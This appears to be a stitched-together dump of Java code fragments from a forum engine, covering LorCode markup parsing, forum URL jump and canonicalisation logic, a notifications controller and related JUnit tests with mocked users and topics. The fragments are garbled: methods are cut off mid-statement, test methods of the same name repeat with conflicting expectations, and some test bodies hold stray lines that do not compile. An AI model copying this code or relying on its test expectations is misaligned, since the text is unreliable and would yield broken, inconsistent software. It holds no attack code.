public String formatJump ( TopicDao messageDao , boolean secure ) throws MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = parsed . getHost ( ) ; int port = parsed . getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
private String parseCommentRSS ( String text , boolean secure ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( secure , true , false ) , text ) . renderXHtml ( ) ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; if ( minimizeCut ) { try { URI fixURI = new URI ( cutURL , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public void initTest ( ) throws Exception { UserService userService = mock ( UserService . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . thenReturn ( false ) ; when ( splinter . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userService . getUserCached ( " splinter " ) ) . thenReturn ( splinter ) ; when ( userService . getUserCached ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userService . getUserCached ( " JB " ) ) . thenReturn ( JB ) ; when ( userService . getUserCached ( " isden " ) ) . thenReturn ( isden ) ; when ( userService . getUserCached ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( userService ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public void init ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) throws Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; ToHtmlFormatter toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserService ( mock ( UserService . class ) ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > tags = topicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , true , null , textMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public void encodeLorUrl ( ) { assertEquals ( " <p><a href= \" https:www.linux.org.ru/forum/linux%3C%3E-org-ru/ \" >www.linux.org.ru/forum/linux&lt;&gt;-org-ru/</a></p> " , 
public void initTest ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , true , " UTF-8 " ) ; canon = new URI ( " https:127.0.0.1:8085/ " , true ) ; messageDao = mock ( TopicDao . class ) ; message1 = mock ( Topic . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Topic . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Topic . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Topic . class ) ; group12 = mock ( Group . class ) ; message15 = mock ( Topic . class ) ; group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . thenReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . thenReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . thenReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . thenReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . thenReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . thenReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . thenReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . thenReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . thenReturn ( message15 ) ; } 
public void test1 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test1n ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test2 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test3 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test6 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url6 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void test7 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url7 ) ; assertEquals ( - 1 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . canonize ( canon ) ) ; } 
public void test13 ( ) throws Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURL lorURI1 = new LorURL ( mainLORURI , url13_1 ) ; LorURL lorURI2 = new LorURL ( mainLORURI , url13_2 ) ; LorURL lorURI3 = new LorURL ( mainLORURI , url13_3 ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c++ " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c%20%20 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c%20c " , lorURI3 . canonize ( canon ) ) ; } 
public void test14 ( ) throws Exception { String url14_1 = " https:www.linux.org.ru/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; String url14_2 = " https:127.0.0.1:8080/jump-message.jsp?msgid=6890857&amp;cid=6892917 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url14_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url14_2 ) ; assertEquals ( 6890857 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " http:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/general/6890857?cid=6892917 " , lorURI1 . formatJump ( messageDao , true ) ) ; assertEquals ( 6890857 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/jump-message.jsp?msgid=6890857&amp;cid=6892917 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI2 . formatJump ( messageDao , true ) ) ; } 
public void test15 ( ) throws Exception { String url15_1 = " https:www.linux.org.ru/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; String url15_2 = " https:127.0.0.1:8080/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " ; LorURL lorURI1 = new LorURL ( mainLORURI , url15_1 ) ; LorURL lorURI2 = new LorURL ( mainURI , url15_2 ) ; assertEquals ( 6944260 , lorURI1 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI1 . getCommentId ( ) ) ; assertTrue ( lorURI1 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI1 . isMessageUrl ( ) ) ; assertTrue ( lorURI1 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " http:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:www.linux.org.ru/forum/linux-org-ru/6944260?cid=6944831 " , lorURI1 . formatJump ( messageDao , true ) ) ; assertEquals ( 6944260 , lorURI2 . getMessageId ( ) ) ; assertEquals ( 6944831 , lorURI2 . getCommentId ( ) ) ; assertTrue ( lorURI2 . isTrueLorUrl ( ) ) ; assertTrue ( lorURI2 . isMessageUrl ( ) ) ; assertTrue ( lorURI2 . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/linux-org-ru/6944260/page4?lastmod=1320084656912#comment-6944831 " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/linux-org-ru/6944260?cid=6944831 " , lorURI2 . formatJump ( messageDao , true ) ) ; } 
public PreparedComment prepareCommentForEdit ( Comment comment , String message , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , false ) ; ApiUserRef ref = userService . ref ( author , null ) ; return new PreparedComment ( comment , 
private String prepareCommentText ( MessageText messageText , boolean nofollow ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , nofollow ) ; 
private String prepareCommentTextRSS ( MessageText messageText , final boolean secure ) { return lorCodeService . prepareTextRSS ( messageText . getText ( ) , messageText . isLorcode ( ) ) ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = tmpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int topics = tmpl . getProf ( ) . getTopics ( ) ; if ( topics > 200 ) { topics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " topics " , topics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , true ) ; long time = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , time + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , true ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , true , topics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = prepareService . prepare ( list , false ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , true ) ; params . put ( " topId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " topicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = topics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public String formatJump ( TopicDao messageDao , URI canonical ) throws MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = messageDao . getGroup ( message ) ; String scheme = canonical . getScheme ( ) ; String host = canonical . getHost ( ) ; int port = canonical . getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public String parseComment ( String text , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( false , nofollow ) , text ) . renderXHtml ( ) ; } 
private String parseCommentRSS ( String text ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( true , false ) , text ) . renderXHtml ( ) ; } 
public String extractPlainTextFromLorcode ( String text ) { return DEFAULT_PARSER . parseRoot ( prepareCommentRootNode ( true , false ) , text ) . renderOg ( ) ; } 
public String parseTopicWithMinimizedCut ( String text , String cutURL , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( true , cutURL , nofollow ) , text ) . renderXHtml ( ) ; } 
public String parseTopic ( String text , boolean nofollow ) { return DEFAULT_PARSER . parseRoot ( prepareTopicRootNode ( false , null , nofollow ) , text ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean rss , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserService ( userService ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setRss ( rss ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean nofollow ) { RootNode rootNode = DEFAULT_PARSER . createRootNode ( ) ; if ( minimizeCut ) { try { URI fixURI = new URI ( cutURL , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserService ( userService ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; rootNode . setNofollow ( nofollow ) ; return rootNode ; } 
public String prepareTextRSS ( String text , boolean lorcode ) { if ( lorcode ) { return parseCommentRSS ( text ) ; 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; TagNode tagNode = ( TagNode ) node ; RootNode rootNode = tagNode . getRootNode ( ) ; ToHtmlFormatter toHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; UserService userService = rootNode . getUserService ( ) ; String result ; try { if ( userService ! = null & & toHtmlFormatter ! = null ) { User user = userService . getUserCached ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" %s \" >%s</a></span> " , toHtmlFormatter . memberURL ( user ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" %s \" >%s</a></s></span> " , toHtmlFormatter . memberURL ( user ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public String format ( String text , boolean nofollow ) { return format ( text , nofollow , null ) ; } 
public String format ( String text , boolean nofollow , RuTypoChanger changer ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , nofollow , changer ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
private String formatWithMagic ( String text , RuTypoChanger changer ) { return changer ! = null ? changer . format ( text ) : text ; } 
public String memberURL ( User user ) throws URIException { URI mainUri = siteConfig . getSecureURI ( ) ; return ( new URI ( mainUri . getScheme ( ) , null , mainUri . getHost ( ) , mainUri . getPort ( ) , String . format ( " /people/%s/profile " , user . getNick ( ) ) ) ) . getEscapedURIReference ( ) ; } 
public void processUrl ( boolean nofollow , @Nonnull StringBuilder out , @Nonnull String urlHref , @Nullable String linktext ) throws URIException { LorURL url = new LorURL ( siteConfig . getMainURI ( ) , urlHref ) ; if ( url . isMessageUrl ( ) ) { processMessageUrl ( out , url , linktext ) ; 
private void processMessageUrl ( @Nonnull StringBuilder out , @Nonnull LorURL url , @Nullable String linkText ) throws URIException { try { Topic message = messageDao . getById ( url . getMessageId ( ) ) ; 
public void listTest2 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][*]two[br][*]three[br][/list] " , toLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , toLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest3 ( ) { String a = " [list] n[*]one n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br][*]two[br][*]three[br][/list] " , toLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one n[*]two n[*]three n[/list] " , toLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a, true) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one</li><li>two</li><li>three</li></ul>", 
public void listTest4 ( ) { String a = " [list] n[*]one ncrap n[*]two n[*]three n[/list] " ; assertEquals ( " [list][br][*]one[br][br]crap[br][*]two[br][*]three[br][/list] " , toLorCodeFormatter . format ( a ) ) ; assertEquals ( " [list] n[*]one ncrap n[*]two n[*]three n[/list] " , toLorCodeTexFormatter . format ( a ) ) ; toLorCodeFormatter.format(a) String b = toLorCodeFormatter.format(a); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<p><br></p><ul><li>one<br><br>crap<br></li><li>two<br></li><li>three<br></li></ul>", lorCodeService.parseTopic(b, false) ); toLorCodeTexFormatter.format(a) b = toLorCodeTexFormatter.format(a); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseComment(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", lorCodeService.parseTopic(b, false) ); assertEquals( "<ul><li>one<p>crap</p></li><li>two</li><li>three</li></ul>", 
public void test1 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test1n ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void test2 ( ) throws Exception { LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
